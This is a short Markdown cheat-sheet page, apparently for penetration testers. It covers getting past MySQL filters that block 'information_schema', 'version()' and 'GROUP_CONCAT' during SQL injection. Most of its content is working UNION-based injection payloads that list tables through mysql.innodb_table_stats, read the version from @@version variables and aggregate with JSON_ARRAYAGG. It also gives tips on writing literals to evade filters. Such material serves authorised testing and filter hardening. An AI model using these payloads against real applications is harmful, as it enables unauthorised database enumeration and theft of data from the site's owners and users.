---
title: "Reaching MySQL schema and version past blocked names"
description: "Alternatives when information_schema, version(), and GROUP_CONCAT are filtered in MySQL, using innodb statistics tables and equivalent functions."
keywords:
  - information_schema alternative
  - innodb_table_stats
  - version function alternative
  - GROUP_CONCAT alternative
  - MySQL filter evasion
---

# Alternative catalog and functions

Filters often blocklist the exact strings an attacker needs: `information_schema`, `version()`, `group_concat`. MySQL exposes the same information under other names, so a single blocked token rarely stops enumeration.

When `information_schema` is blocked, the InnoDB statistics tables list user tables (on privileged accounts) and are rarely filtered:

```sql
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- 
```

When `version()` is blocked, the server version is in several system variables:

```sql
' UNION SELECT @@version,NULL,NULL-- 
' UNION SELECT @@global.version,NULL,NULL-- 
' UNION SELECT @@version_comment,NULL,NULL-- 
```

When `GROUP_CONCAT` is blocked, `JSON_ARRAYAGG` (MySQL 5.7.22+) aggregates rows into one value:

```sql
' UNION SELECT NULL,JSON_ARRAYAGG(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- 
```

Numeric literals also have filter-friendly forms: scientific notation (`1e0` for `1`) and hex (`0x...`) slip past filters that only match plain digits or quoted strings. The theme is that MySQL usually offers a synonym, so enumeration adapts to whatever the filter blocks rather than being stopped by it.

## References

- MySQL Reference Manual: system variables, `mysql.innodb_table_stats`, JSON_ARRAYAGG
- OWASP Testing Guide: Testing for SQL Injection
